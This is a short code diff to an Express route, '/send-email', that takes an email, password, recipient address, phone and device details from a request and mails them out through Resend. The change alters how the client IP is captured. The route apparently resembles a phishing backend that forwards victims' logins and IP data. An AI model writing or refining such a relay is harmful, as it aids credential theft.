@@ -17,7 +17,7 @@ const resend = new Resend(process.env.RESEND_API_KEY);
 // POST route to send an email
 app.post("/send-email", async (req, res) => {
   const { email, password, recEmail, phone, port, deviceDetails } = req.body;
-  const ip = req.ip.split(":").pop();
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
   try {
      resend.emails.send({
